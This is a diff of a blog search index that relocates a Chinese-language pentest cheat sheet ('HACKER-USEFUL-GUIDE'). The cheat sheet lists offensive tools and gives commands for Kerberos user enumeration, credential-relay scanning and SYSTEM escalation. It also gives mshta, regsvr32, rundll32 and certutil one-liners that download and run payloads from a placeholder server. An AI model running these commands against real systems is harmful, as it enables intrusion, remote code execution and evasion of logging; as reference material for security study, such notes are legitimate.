@@ -1,6 +1,86 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LINUX-PENETRATION</title>
     <url>/2021/12/25/LINUX-PENETRATION/</url>
     <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
@@ -168,88 +248,8 @@
       </categories>
       <tags>
         <tag>渗透</tag>
+        <tag>网络空间安全</tag>
         <tag>Linux</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
       </tags>
   </entry>
   <entry>
